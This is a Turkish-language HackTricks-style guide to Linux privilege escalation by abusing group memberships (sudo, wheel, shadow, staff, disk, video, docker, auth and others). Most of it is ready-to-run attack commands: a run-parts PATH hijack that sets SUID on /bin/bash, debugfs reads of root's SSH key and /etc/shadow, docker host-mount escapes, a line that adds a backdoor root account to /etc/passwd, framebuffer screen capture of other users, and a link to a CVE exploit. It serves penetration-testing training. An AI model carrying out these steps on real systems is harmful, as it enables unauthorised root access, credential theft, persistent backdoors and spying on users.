# İlginç Gruplar - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Grupları

### **PE - Method 1**

**Bazen**, **varsayılan olarak (veya bazı yazılımlar ihtiyaç duyduğu için)** **/etc/sudoers** dosyasının içinde şu satırlardan bazılarını bulabilirsiniz:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Bu, **sudo veya admin grubuna ait herhangi bir kullanıcının sudo olarak her şeyi çalıştırabileceği** anlamına gelir.

Durum buysa, **root olmak için yalnızca şunu çalıştırabilirsiniz**:
```
sudo su
```
### PE - Method 2

Tüm suid binary'lerini bulun ve **Pkexec** binary'sinin olup olmadığını kontrol edin:
```bash
find / -perm -4000 2>/dev/null
```
Binary **pkexec'in bir SUID binary** olduğunu ve **sudo** veya **admin** grubuna dahil olduğunuzu fark ederseniz, `pkexec` kullanarak muhtemelen binary'leri sudo olarak çalıştırabilirsiniz.\
Bunun nedeni, bu grupların genellikle **polkit policy** içindeki gruplar olmasıdır. Bu policy, temelde hangi grupların `pkexec` kullanabileceğini belirler. Şununla kontrol edin:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Burada **pkexec** çalıştırmasına izin verilen grupları bulabilirsiniz ve bazı Linux dağıtımlarında **varsayılan olarak** **sudo** ve **admin** grupları görünür.

**root olmak için şunu çalıştırabilirsiniz**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
**pkexec** çalıştırmayı denediğinizde bu **hatayı** alırsanız:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Bu, yetkilere sahip olmadığınız için değil, GUI olmadan bağlı olmadığınız için olur**. Bu sorun için burada bir geçici çözüm bulunmaktadır: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2 farklı ssh oturumuna** ihtiyacınız var:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Grubu

**Bazen**, varsayılan olarak **/etc/sudoers** dosyasında şu satırı bulabilirsiniz:
```
%wheel	ALL=(ALL:ALL) ALL
```
Bu, **wheel grubuna ait herhangi bir kullanıcının sudo olarak her şeyi çalıştırabileceği** anlamına gelir.

Durum buysa, **root olmak için şunu çalıştırmanız yeterlidir**:
```
sudo su
```
## shadow Grubu

**shadow grubundaki** kullanıcılar **/etc/shadow** dosyasını **okuyabilir**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Bu nedenle dosyayı okuyun ve **bazı hash'leri crack etmeyi** deneyin.

Hash'leri incelerken hızlı kilit durumu ayrıntısı:
- `!` veya `*` içeren girdiler genellikle password login için etkileşimli değildir.
- `!hash` genellikle bir password ayarlanıp ardından kilitlendiği anlamına gelir.
- `*` genellikle hiçbir geçerli password hash'inin ayarlanmadığı anlamına gelir.
Bu, direct login engellenmiş olsa bile account classification için kullanışlıdır.

## Staff Group

**staff**: Kullanıcıların root privileges gerektirmeden sistemde (`/usr/local`) yerel değişiklikler yapmasına olanak tanır (herhangi bir kullanıcının PATH variable'ında `/usr/local/bin` içindeki executable'ların bulunduğunu ve aynı ada sahip `/bin` ve `/usr/bin` içindeki executable'ları "override" edebileceklerini unutmayın). Monitoring/security ile daha ilgili olan "adm" group'u ile karşılaştırın. [\[source\]](https://wiki.debian.org/SystemGroups)

Debian distributions'ta `$PATH` variable, privileged user olsanız da olmasanız da `/usr/local/` dizininin en yüksek priority ile çalıştırılacağını gösterir.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
`/usr/local` içindeki bazı programları hijack edebilirsek root yetkisini kolayca elde edebiliriz.

`run-parts` programını hijack etmek root yetkisini kolayca elde etmenin bir yoludur; çünkü çoğu program `run-parts` çalıştırır (crontab ve SSH ile giriş sırasında olduğu gibi).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
veya yeni bir ssh oturumu açıldığında.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Bu ayrıcalık, makinenin içindeki tüm verilere erişebileceğiniz için neredeyse **root access** ile eşdeğerdir.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
debugfs kullanarak **dosya yazabileceğinizi** de unutmayın. Örneğin `/tmp/asd1.txt` dosyasını `/tmp/asd2.txt` dosyasına kopyalamak için şunu yapabilirsiniz:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Ancak, **root** tarafından sahip olunan dosyalara (örneğin `/etc/shadow` veya `/etc/passwd`) **write** etmeye çalışırsanız "**Permission denied**" hatası alırsınız.

## Video Grubu

`w` komutunu kullanarak **sistemde kimin oturum açtığını** bulabilirsiniz ve aşağıdakine benzer bir çıktı görüntülenir:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**, **yossi** kullanıcısının makinedeki bir terminale **fiziksel olarak giriş yaptığını** belirtir.

**video group**, ekran çıktısını görüntüleme erişimine sahiptir. Temel olarak ekranları gözlemleyebilirsiniz. Bunu yapmak için ekrandaki **mevcut görüntüyü** ham veri olarak almanız ve ekranın kullandığı çözünürlüğü öğrenmeniz gerekir. Ekran verileri `/dev/fb0` konumuna kaydedilebilir; bu ekranın çözünürlüğünü `/sys/class/graphics/fb0/virtual_size` konumunda bulabilirsiniz.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**raw image** dosyasını **açmak** için **GIMP** kullanabilir, **`screen.raw`** dosyasını seçebilir ve dosya türü olarak **Raw image data** seçeneğini belirleyebilirsiniz:

![Disk Group - Video Group: Raw image dosyasını açmak için GIMP kullanabilir, screen.raw dosyasını seçebilir ve dosya türü olarak Raw image data seçeneğini belirleyebilirsiniz](<../../../images/image (463).png>)

Ardından **Width** ve **Height** değerlerini ekranda kullanılan değerlerle değiştirin ve farklı **Image Types** seçeneklerini kontrol edin (ekranı en iyi göstereni seçin):

![Disk Group - Video Group: Ardından Width ve Height değerlerini ekranda kullanılan değerlerle değiştirin ve farklı Image Types seçeneklerini kontrol edin (ekranı en iyi göstereni seçin)](<../../../images/image (317).png>)

## Root Grubu

Varsayılan olarak **root grubunun üyelerinin**, ayrıcalıkları yükseltmek için kullanılabilecek bazı **service** yapılandırma dosyalarını, bazı **library** dosyalarını veya **diğer ilginç şeyleri** değiştirme erişimine sahip olabileceği görülüyor...

**root üyelerinin değiştirebileceği dosyaları kontrol edin**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

**Ana makinenin root filesystem’ını bir instance’ın volume’una mount edebilirsiniz**, böylece instance başladığında bu volume’a otomatik olarak bir `chroot` yükler. Bu, makine üzerinde root yetkisi elde etmenizi sağlar.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Son olarak, önceki önerilerden hiçbirini beğenmiyorsanız veya herhangi bir nedenle çalışmıyorsa (docker api firewall?), burada açıklandığı üzere her zaman **privileged bir container çalıştırıp içinden escape etmeyi** deneyebilirsiniz:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Docker socket üzerinde write permission'ınız varsa, [**docker socket'i abuse ederek nasıl privilege escalation yapılacağını anlatan bu postu**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)** okuyun.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Grubu


{{#ref}}
./
{{#endref}}

## Adm Grubu

Genellikle **`adm`** grubunun **üyeleri**, _/var/log/_ içinde bulunan **log** dosyalarını **okuma** izinlerine sahiptir.\
Bu nedenle, bu gruptaki bir kullanıcıyı compromise ettiyseniz kesinlikle **loglara göz atmalısınız**.

## Backup / Operator / lp / Mail Grupları

Bu gruplar, doğrudan root vektörlerinden ziyade genellikle **credential-discovery** vektörleridir:
- **backup**: config'ler, key'ler, DB dump'ları veya token'lar içeren arşivleri açığa çıkarabilir.
- **operator**: hassas runtime verilerini leak edebilecek platforma özgü operasyonel erişim sağlayabilir.
- **lp**: print queue/spool'ları belge içerikleri barındırabilir.
- **mail**: mail spool'ları reset link'lerini, OTP'leri ve dahili credential'ları açığa çıkarabilir.

Buradaki üyeliği yüksek değerli bir data exposure bulgusu olarak değerlendirin ve password/token reuse üzerinden pivot edin.

## Auth Grubu

OpenBSD'de **auth** grubu, kullanılıyorlarsa genellikle _**/etc/skey**_ ve _**/var/db/yubikey**_ klasörlerine write edebilir.\
Bu izinler, aşağıdaki exploit ile root'a **privilege escalation** yapmak için abuse edilebilir: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
